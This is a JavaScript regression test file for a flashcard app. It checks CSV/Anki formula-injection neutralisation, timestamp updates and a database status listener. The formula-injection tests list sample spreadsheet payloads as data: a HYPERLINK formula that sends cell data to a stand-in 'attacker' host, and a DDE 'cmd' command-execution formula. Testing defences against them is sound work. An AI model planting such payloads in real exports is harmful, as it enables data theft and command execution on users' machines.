// tests/p0-fixes.test.mjs —— 2026-08-29 审计清单阶段一 P0 回归测试
// 覆盖：
//   S1   CSV/TSV/Anki 公式注入中和（sheetCellGuard + toCSV 整链路）
//   M1① repo.applyCardFeedback：ease/dueAt 变更 bump reviewedAt（SRS 水位推进，不碰 updatedAt）
//   M1② utils/quickCheck.recordQuickCheck：卡片侧 bump updatedAt（内容水位推进，校验随内容侧同步）
//   R3   db.js 状态机可用（getDbStatus / onDbStatusChange 订阅退订）
// 说明：rescueCard/rescueAll（Cards.vue 组件内）与 applyCardFeedback 同为
//   「put dueAt + reviewedAt」模式，由全路由 CDP 冒烟（smoke-cdp.mjs）兜底，不在此重复。
// 必须最先 import fake-indexeddb/auto，再 import 依赖 db.js 的模块。
import 'fake-indexeddb/auto';
import './_env.mjs';
import test, { after } from 'node:test';
import assert from 'node:assert/strict';
import { db } from '../src/db.js';
import { createCard, applyCardFeedback } from '../src/repo.js';
import { recordQuickCheck } from '../src/utils/quickCheck.js';
import { sheetCellGuard, toCSV } from '../src/utils/exporters.js';
import { livenessTs } from '../src/sync-manifest.js';
import { getDbStatus, onDbStatusChange } from '../src/db.js';

after(async () => { try { await db.close(); } catch {} });

async function mkCard() {
  return createCard({ front: '正面', back: '背面', subject: '计组', source: 'test' });
}

// ---------- S1 CSV/TSV/Anki 公式注入 ----------

test('S1 sheetCellGuard：以 = + - @ 开头的单元格前置单引号中和', () => {
  const evils = ['=HYPERLINK("http://attacker/?d="&B1,"点")', '+SUM(A1:A9)', '-1+2', '@cmd', '=cmd|\'/c calc\'!A1'];
  for (const evil of evils) {
    assert.ok(sheetCellGuard(evil).startsWith("'"), `${evil} 应被中和`);
    assert.equal(sheetCellGuard(evil), `'${evil}`);
  }
});

test('S1 sheetCellGuard：普通文本 / 空格开头 / 公式关键字中缀不受影响', () => {
  assert.equal(sheetCellGuard('正常内容'), '正常内容');
  assert.equal(sheetCellGuard('  =前导空格'), '  =前导空格'); // 空格开头不是公式
  assert.equal(sheetCellGuard('a=b'), 'a=b');                 // 非首字符不影响
  assert.equal(sheetCellGuard(''), '');
  assert.equal(sheetCellGuard(null), '');
  assert.equal(sheetCellGuard(42), '42');
});

test('S1 toCSV 整链路：公式载荷导出后带中和前缀', () => {
  const csv = toCSV(['正面', '背面'], [['=HYPERLINK("http://x")', '正常']]);
  assert.ok(csv.includes("'=HYPERLINK"), 'CSV 正文应含中和后的载荷');
  // 双引号路径也不能绕过：含逗号时走双引号包裹，前缀仍在
  const csv2 = toCSV(['A'], [['=x, y']]);
  assert.ok(csv2.includes("\"'=x, y\""), '被双引号包裹的单元格同样带中和前缀');
});

// ---------- M1① applyCardFeedback 时间戳 ----------

test('M1① applyCardFeedback：bump reviewedAt（SRS 水位推进），不碰 updatedAt（内容侧）', async () => {
  const c = await mkCard();
  const before = await db.cards.get(c.id);
  const t0 = livenessTs(before);
  const f = await applyCardFeedback(c.id, { signal: 'good' });
  assert.ok(f, '返回排期结果');
  const after = await db.cards.get(c.id);
  assert.ok(after.reviewedAt > 0, 'reviewedAt 被写入（此前只 put ease/dueAt，永不进增量包）');
  assert.ok(after.reviewedAt >= after.dueAt || after.dueAt > 0, 'dueAt 同步更新');
  assert.ok(livenessTs(after) > t0, '活跃水位推进 → 该卡随下次增量包上传，对端不再回滚');
  assert.equal(after.updatedAt, before.updatedAt, '内容侧 updatedAt 必须原样保留');
});

// ---------- M1② recordQuickCheck 时间戳 ----------

test('M1② recordQuickCheck：卡片侧 bump updatedAt（校验随内容侧同步）', async () => {
  const c = await mkCard();
  const before = await db.cards.get(c.id);
  const u0 = before.updatedAt;
  await recordQuickCheck(c.id, true);
  const after = await db.cards.get(c.id);
  assert.ok(after.quickCheckedAt > 0, 'quickCheckedAt 已记录');
  assert.ok(after.quickCheckedAt >= before.quickCheckedAt || before.quickCheckedAt === undefined);
  assert.ok(after.updatedAt > u0, 'updatedAt 被推高 → 校验动作随内容侧增量包上传');
  // reviews 侧也应落一条 type=quick（供统计）
  const revs = await db.reviews.where('cardId').equals(c.id).toArray();
  assert.ok(revs.some((r) => r.type === 'quick'), 'reviews 表应有 quick 记录');
});

// ---------- R3 IndexedDB 故障可见性 ----------

test('R3 db 状态机：getDbStatus / onDbStatusChange 可订阅退订', async () => {
  // fake-indexeddb 下 open 成功 → 初始应为 ok
  assert.equal(getDbStatus(), 'ok');
  let got = null;
  const unsub = onDbStatusChange((s) => { got = s; });
  assert.equal(typeof unsub, 'function');
  unsub();
  assert.ok(true);
});
